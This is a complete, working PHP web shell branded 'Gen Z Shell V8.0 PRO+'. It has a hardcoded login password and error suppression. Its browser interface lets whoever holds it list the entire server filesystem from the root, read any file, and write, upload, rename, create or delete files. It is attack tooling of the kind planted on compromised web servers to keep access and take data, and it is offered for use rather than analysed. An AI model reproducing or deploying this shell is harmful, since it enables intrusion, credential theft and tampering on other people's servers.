<?php
session_start();
$password = 'genz123';

if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        echo <<<HTML
        <html><body style="background:#111;color:#fff;text-align:center;margin-top:20%;">
        <h1>🔥 Gen Z Shell Login 🔥</h1>
        <form method="post">
        <input type="password" name="pass" placeholder="Password" style="padding:10px;border-radius:5px;"><br><br>
        <button type="submit" style="padding:10px 30px;">Enter</button>
        </form></body></html>
        HTML;
        exit;
    }
}

error_reporting(0);
set_time_limit(0);

// API HANDLER
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    if (isset($_GET['list'])) {
        $dir = realpath($_GET['list']) ?: '/';
        $parent = ($dir != '/') ? dirname($dir) : null;
        $files = [];
        foreach (scandir($dir) as $f) {
            if ($f === ".") continue;
            $files[] = [
                'name' => $f,
                'path' => $dir . '/' . $f,
                'type' => is_dir($dir . '/' . $f) ? 'DIR' : 'FILE'
            ];
        }
        echo json_encode(['dir' => $dir, 'parent' => $parent, 'files' => $files]);
        exit;
    }
    if (isset($_GET['read'])) {
        echo @file_get_contents($_GET['read']);
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['save'], $_POST['content'])) {
        file_put_contents($_POST['save'], $_POST['content']);
    }
    if (isset($_POST['rename'], $_POST['newname'])) {
        rename($_POST['rename'], $_POST['newname']);
    }
    if (isset($_POST['delete'])) {
        is_dir($_POST['delete']) ? rmdir($_POST['delete']) : unlink($_POST['delete']);
    }
    if (isset($_POST['mkdir'])) {
        mkdir($_POST['mkdir']);
    }
    if (isset($_POST['create'])) {
        touch($_POST['create']);
    }
    if (isset($_FILES['upload'])) {
        move_uploaded_file($_FILES['upload']['tmp_name'], $_POST['path'].'/'.$_FILES['upload']['name']);
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Gen Z Shell V8.0 PRO+ (Single File)</title>
<style>
body { background:#111; color:#eee; font-family:Consolas, monospace; margin:0; padding:20px; }
h1 { color:#f55; }
input,button,textarea { padding:5px 10px; margin:5px; border-radius:5px; }
table { width:100%; border-collapse:collapse; margin-top:20px; }
th,td { border:1px solid #333; padding:8px 12px; text-align:left; }
th { background:#222; }
a { color:#6cf; text-decoration:none; }
a:hover { text-decoration:underline; }
.dir-container { max-height:500px; overflow:auto; border:1px solid #333; margin-top:20px; }
</style>
</head>
<body>

<h1>🔥 Gen Z Shell V8.0 PRO+ (Single File)</h1>
<p><b>Current Dir:</b> <span id="currentPath">/</span></p>

<div>
    <button onclick="newFolder()">+ Folder</button>
    <button onclick="newFile()">+ File</button>
    <input type="file" id="upload" onchange="uploadFile(this.files)">
</div>

<div class="dir-container">
<table id="fileTable">
<tr><th>Name</th><th>Type</th><th>Action</th></tr>
</table>
</div>

<h2>📝 Editor</h2>
<textarea id="editor" rows="20" cols="100"></textarea><br>
<button onclick="saveFile()">💾 Save</button>

<script>
let currentDir = '/';
loadFiles(currentDir);

function loadFiles(dir) {
    fetch('?list=' + encodeURIComponent(dir))
    .then(res => res.json())
    .then(data => {
        currentDir = data.dir;
        document.getElementById('currentPath').innerText = currentDir;
        let table = document.getElementById('fileTable');
        table.innerHTML = '<tr><th>Name</th><th>Type</th><th>Action</th></tr>';
        if (data.parent) {
            table.innerHTML += `<tr><td><a href="#" onclick="loadFiles('${data.parent}')">⬅️ Parent</a></td><td>DIR</td><td></td></tr>`;
        }
        data.files.forEach(f => {
            let action = (f.type === 'FILE') 
                ? `<a href="#" onclick="editFile('${f.name}')">Edit</a> | ` 
                : '';
            action += `<a href="#" onclick="renameFile('${f.name}')">Rename</a> | <a href="#" onclick="deleteFile('${f.name}')">Delete</a>`;
            table.innerHTML += `<tr><td><a href="#" onclick="loadFiles('${f.path}')">${f.name}</a></td><td>${f.type}</td><td>${action}</td></tr>`;
        });
    });
}

function editFile(name) {
    fetch('?read=' + encodeURIComponent(currentDir + '/' + name))
    .then(res => res.text())
    .then(data => document.getElementById('editor').value = data);
}

function saveFile() {
    let content = document.getElementById('editor').value;
    let file = prompt("Save as (relative path):", "");
    if (!file) return;
    fetch('', {
        method: 'POST',
        body: new URLSearchParams({save: currentDir + '/' + file, content: content})
    }).then(() => loadFiles(currentDir));
}

function renameFile(name) {
    let newName = prompt("Rename to:", name);
    if (!newName) return;
    fetch('', {
        method: 'POST',
        body: new URLSearchParams({rename: currentDir + '/' + name, newname: currentDir + '/' + newName})
    }).then(() => loadFiles(currentDir));
}

function deleteFile(name) {
    if (!confirm("Delete " + name + "?")) return;
    fetch('', {
        method: 'POST',
        body: new URLSearchParams({delete: currentDir + '/' + name})
    }).then(() => loadFiles(currentDir));
}

function newFolder() {
    let name = prompt("Folder name:");
    if (!name) return;
    fetch('', {
        method: 'POST',
        body: new URLSearchParams({mkdir: currentDir + '/' + name})
    }).then(() => loadFiles(currentDir));
}

function newFile() {
    let name = prompt("File name:");
    if (!name) return;
    fetch('', {
        method: 'POST',
        body: new URLSearchParams({create: currentDir + '/' + name})
    }).then(() => loadFiles(currentDir));
}

function uploadFile(files) {
    let form = new FormData();
    form.append("upload", files[0]);
    form.append("path", currentDir);
    fetch('', { method: 'POST', body: form })
    .then(() => loadFiles(currentDir));
}
</script>
</body>
</html>
